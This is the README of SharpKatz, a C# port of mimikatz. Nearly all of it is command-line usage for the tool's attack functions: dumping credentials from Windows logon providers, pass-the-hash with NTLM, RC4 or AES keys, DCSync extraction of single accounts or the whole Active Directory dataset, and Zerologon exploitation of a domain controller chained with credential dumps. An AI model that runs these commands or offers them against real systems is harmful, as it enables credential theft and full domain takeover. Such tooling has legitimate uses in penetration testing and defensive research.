# SharpKatz
Porting of mimikatz sekurlsa::logonpasswords,  sekurlsa::ekeys and lsadump::dcsync commands

## Usage

### Ekeys

```SharpKatz.exe --Command ekeys```<br>
 list Kerberos encryption keys <br>
 <br>

### Msv

```SharpKatz.exe --Command msv``` <br>
Retrive user credentials from Msv provider <br>
<br>

### Kerberos

```SharpKatz.exe --Command kerberos```<br>
Retrive user credentials from Kerberos provider <br>
<br>

### Tspkg

```SharpKatz.exe --Command tspkg```<br>
Retrive user credentials from Tspkg provider <br>
<br>

### Credman

```SharpKatz.exe --Command credman```<br>
Retrive user credentials from Credman provider <br>
<br>

### WDigest

```SharpKatz.exe --Command wdigest```<br>
Retrive user credentials from WDigest provider <br>
<br>

### Logonpasswords

```SharpKatz.exe --Command logonpasswords```<br>
Retrive user credentials from all providers <br>
<br>

### Pth

```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash```<br>
Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password<br>
<br>
```SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key```<br>
Perform pth to create a process under userdomain\username credential user's rc4 key<br>
<br>
```SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash```<br>
Replace ntlm hash for an existing logonsession <br>
<br>
```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes256 aes256```<br>
Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password and aes256 key <br>
<br>

### DCSync

```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
Dump user credential by username <br>
<br>
```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
Dump user credential by GUID <br>
<br>
```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
Export the entire dataset from AD to a file created in the current user's temp forder<br>
<br>
```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Dump user credential by username using alternative credentials<br>
<br>
```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Dump user credential by GUID using alternative credentials<br>
<br>
```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
Export the entire dataset from AD to a file created in the current user's temp forder using alternative credentials<br>
<br>

### Zerologon

No reference to logoncli.dll, using the direct rpc call works even from a [non-domain joined workstation](https://twitter.com/gentilkiwi/status/1306178689630076929)

```SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
Perform Zerologon check <br>
<br>
```SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
Perform Zerologon attack <br>
<br>
```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and dump user credential by username <br>
<br>
```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --Guid guid --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and dump user credential by GUID <br>
<br>
```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
Perform Zerologon attack and export the entire dataset from AD to a file created in the current user's temp forder<br>
<br>
Note: Do not use zerologon in a production environment or at least plan for recovery actions which are detailed [here](https://github.com/dirkjanm/CVE-2020-1472) 


## Credits

This project depends entirely on the work of [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Vincent Le Toux](https://twitter.com/mysmartlogon) on [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [MakeMeEnterpriseAdmin](https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1) projects.<br>
The analysis of the code was conducted following the example from [this blog post](https://blog.xpnsec.com/exploring-mimikatz-part-1/) by [xpn](https://twitter.com/_xpn_).<br>
<br>
